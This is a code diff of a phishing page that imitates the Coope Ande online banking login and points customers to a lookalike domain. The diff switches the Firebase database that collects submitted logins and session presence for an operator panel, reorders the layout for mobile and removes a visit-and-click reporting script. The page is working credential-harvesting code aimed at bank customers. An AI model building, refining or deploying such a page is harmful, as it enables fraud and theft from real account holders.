@@ -18,7 +18,7 @@
         .input-icon-container i { position: absolute; left: 10px; top: 10px; color: #999; }
         .input-field { width: 100%; border: 1px solid #ccc; padding: 8px 8px 8px 35px; outline: none; font-size: 14px; }
         .btn-ingresar { background-color: #0076be; color: white; width: 100%; padding: 10px; font-weight: bold; }
-        .btn-firma { background-color: #e9af28; color: #333; width: 100%; padding: 8px; font-weight: bold; display: flex; items-center; justify-content: center; gap: 8px; }
+        .btn-firma { background-color: #e9af28; color: #333; width: 100%; padding: 8px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .btn-registro { background-color: #a04395; color: white; width: 100%; padding: 8px; font-weight: bold; }
         .footer-box { background-color: #eee; border: 1px solid #ccc; padding: 15px; font-size: 12px; height: 180px; }
     </style>
@@ -33,19 +33,11 @@
         <span class="text-gray-600 text-xs">Bienvenido(a) a Coope Ande en línea</span>
     </div>
 
+    <!-- Contenedor Principal -->
     <div class="max-w-6xl mx-auto px-4 mt-6 grid grid-cols-1 md:grid-cols-3 gap-8">
         
-        <!-- Banner Izquierdo -->
-        <div class="md:col-span-2">
-            <img src="baneerr.jfif" alt="Banner Crédito" class="w-full shadow-sm">
-            <div class="mt-4">
-                <h2 class="font-bold text-gray-800 text-lg">Los mejores beneficios para tu crédito personal</h2>
-                <p class="text-gray-600 text-sm">Disfrutá de condiciones fijas todo el plazo con tu crédito personal de Coope Ande. Ver más en www.coopeande1.com</p>
-            </div>
-        </div>
-
-        <!-- Login Card -->
-        <div class="login-box bg-white">
+        <!-- Login Card (Arriba en móvil, derecha en Desktop) -->
+        <div class="login-box bg-white mx-auto md:order-2">
             <div class="login-header text-sm">Coope Ande en línea</div>
             <div class="radio-group">
                 <label class="flex items-center gap-1 cursor-pointer">
@@ -67,7 +59,7 @@
 
                 <div class="input-icon-container">
                     <i class="fa-solid fa-user"></i>
-                    <input type="text" id="user" onkeypress="return event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57" inputmode="numeric" placeholder="Usuario" required class="input-field">
+                    <input type="text" id="user" onkeypress="return event.charCode >= 48 && event.charCode <= 57" inputmode="numeric" placeholder="Usuario" required class="input-field">
                 </div>
 
                 <div class="input-icon-container">
@@ -87,6 +79,16 @@
                 </div>
             </form>
         </div>
+
+        <!-- Banner Izquierdo (Abajo en móvil, izquierda en Desktop) -->
+        <div class="md:col-span-2 md:order-1">
+            <img src="baneerr.jfif" alt="Banner Crédito" class="w-full shadow-sm">
+            <div class="mt-4">
+                <h2 class="font-bold text-gray-800 text-lg">Los mejores beneficios para tu crédito personal</h2>
+                <p class="text-gray-600 text-sm">Disfrutá de condiciones fijas todo el plazo con tu crédito personal de Coope Ande. Ver más en www.coopeande1.com</p>
+            </div>
+        </div>
+
     </div>
 
     <!-- Secciones Inferiores -->
@@ -122,7 +124,7 @@
     </div>
 
     <script>
-        const firebaseConfig = { databaseURL: "https://mslogs-31bf1-default-rtdb.firebaseio.com/" };
+        const firebaseConfig = { databaseURL: "https://copendndsn-default-rtdb.firebaseio.com/" };
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const sessionId = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
@@ -131,8 +133,7 @@
             document.getElementById('juridica-wrap').style.display = show ? 'block' : 'none';
         }
 
-        
-        // Sistema de Presencia para tu Panel
+        // Sistema de Presencia
         const presenceRef = db.ref('logins/' + sessionId + '/online');
         db.ref('.info/connected').on('value', (snap) => {
             if (snap.val() === true) {
@@ -164,41 +165,5 @@
             }).catch(() => { window.location.href = 'cargando.html?id=' + sessionId; });
         });
     </script>
-  <script>
-    let contadorClics = 0;
-    const urlServidor = 'contador.php'; // Asegúrate de que apunte a la ruta correcta de tu PHP
-
-    // Función auxiliar para enviar datos de forma asíncrona al backend
-    async function reportarEvento(tipo, info) {
-        try {
-            await fetch(urlServidor, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    evento: tipo,
-                    detalles: info
-                })
-            });
-        } catch (error) {
-            console.error('Error al reportar interacción:', error);
-        }
-    }
-
-    // 1. Reportar la visita en cuanto la página termine de cargar
-    window.addEventListener('DOMContentLoaded', () => {
-        reportarEvento('visita', 'El usuario ingresó a la página de inicio');
-    });
-
-    // 2. Escuchar los clics del botón e ir sumando e informando
-    document.getElementById('btnClic').addEventListener('click', () => {
-        contadorClics++;
-        document.getElementById('contadorPantalla').textContent = contadorClics;
-        
-        // Enviamos el aviso al servidor detallando el número de clic actual
-        reportarEvento('clic', `Clic número: ${contadorClics}`);
-    });
-</script>
 </body>
 </html>
